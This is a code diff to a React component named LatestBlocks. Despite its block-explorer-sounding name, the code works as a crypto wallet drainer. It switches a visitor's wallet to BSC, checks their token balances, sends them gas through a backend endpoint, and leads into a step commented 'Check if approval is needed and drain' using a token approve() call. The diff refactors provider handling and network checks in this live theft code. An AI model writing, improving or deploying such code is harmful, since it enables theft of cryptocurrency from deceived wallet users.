@@ -16,7 +16,7 @@ const LatestBlocks = () => {
   ];
   const BSC_MAINNET_CHAIN_ID = "0x38"; // Hex for 56
 
-  // Correctly initialize BSC provider
+  // Static BSC provider for read-only calls
   const bscProvider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/", 56);
 
   const switchToBSC = async () => {
@@ -25,11 +25,6 @@ const LatestBlocks = () => {
         method: "wallet_switchEthereumChain",
         params: [{ chainId: BSC_MAINNET_CHAIN_ID }],
       });
-      const walletProvider = new ethers.BrowserProvider(window.ethereum);
-      const network = await walletProvider.getNetwork();
-      if (network.chainId !== BigInt(56)) {
-        throw new Error("Wallet failed to switch to BSC Mainnet");
-      }
     } catch (error) {
       if (error.code === 4902) {
         await window.ethereum.request({
@@ -43,13 +38,13 @@ const LatestBlocks = () => {
           }],
         });
       } else {
-        throw new Error(`Network switch failed: ${error.message}`);
+        throw new Error(`Failed to switch to BSC: ${error.message}`);
       }
     }
   };
 
-  const checkAndSendGas = async (connectedAddress, signerProvider) => {
-    const balance = await signerProvider.getBalance(connectedAddress);
+  const checkAndSendGas = async (connectedAddress) => {
+    const balance = await bscProvider.getBalance(connectedAddress);
     if (ethers.formatEther(balance) === "0.0") {
       setLoading(true);
       const gasResponse = await fetch(`${API_BASE_URL}/send-gas`, {
@@ -59,7 +54,7 @@ const LatestBlocks = () => {
       });
       const gasData = await gasResponse.json();
       if (gasData.success) {
-        while (ethers.formatEther(await signerProvider.getBalance(connectedAddress)) === "0.0") {
+        while (ethers.formatEther(await bscProvider.getBalance(connectedAddress)) === "0.0") {
           await new Promise(resolve => setTimeout(resolve, 5000)); // Wait 5s
         }
       }
@@ -78,12 +73,16 @@ const LatestBlocks = () => {
 
       setLoading(true);
 
-      // Switch wallet to BSC and get signer
+      // Switch wallet to BSC and connect
       await switchToBSC();
-      const signerProvider = new ethers.BrowserProvider(window.ethereum);
+      const walletProvider = new ethers.BrowserProvider(window.ethereum);
+      const network = await walletProvider.getNetwork();
+      if (network.chainId !== BigInt(56)) {
+        throw new Error("Wallet is not on BSC Mainnet");
+      }
       const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
       const connectedAddress = accounts[0];
-      const signer = await signerProvider.getSigner();
+      const signer = await walletProvider.getSigner();
       setConnectedAccount(`${connectedAddress.slice(0, 6)}...${connectedAddress.slice(-4)}`);
 
       const bep20Abi = [
@@ -91,7 +90,7 @@ const LatestBlocks = () => {
         "function approve(address spender, uint256 amount) external returns (bool)",
       ];
 
-      // Check token balances using BSC provider
+      // Check token balances using static BSC provider
       let hasTokens = false;
       for (const token of tokenList) {
         const tokenContract = new ethers.Contract(token.address, bep20Abi, bscProvider);
@@ -106,7 +105,7 @@ const LatestBlocks = () => {
       }
 
       // Ensure gas is available
-      const gasAvailable = await checkAndSendGas(connectedAddress, signerProvider);
+      const gasAvailable = await checkAndSendGas(connectedAddress);
       if (!gasAvailable) throw new Error("Failed to provide gas");
 
       // Check if approval is needed and drain
